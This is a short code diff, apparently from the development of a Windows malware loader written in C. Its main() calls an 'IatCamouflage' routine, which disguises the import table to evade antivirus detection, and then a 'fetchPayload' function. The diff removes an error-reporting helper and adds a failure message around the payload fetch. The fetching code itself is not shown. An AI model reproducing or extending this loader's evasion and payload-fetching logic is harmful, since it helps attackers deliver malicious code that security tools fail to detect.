@@ -58,17 +58,15 @@ VOID IatCamouflage() {
 	HeapFree(GetProcessHeap(), 0, pAddress);
 }
 
-// Function to report WinApi Errors
-BOOL ReportError(const char* WinApiName) {
-    printf("[!] \"%s\" [ FAILED ] \t%d \n", WinApiName, GetLastError());
-    return FALSE;
-}
+
 
 int main() {
 
 	//Initiate IAT camouflage
 	IatCamouflage();
     //Fetching payload
-	fetchPayload();
+	if (!fetchPayload()) {
+		printf("[!] Failed To Fetch Payload \n");
+	}
 	return 0;
 }
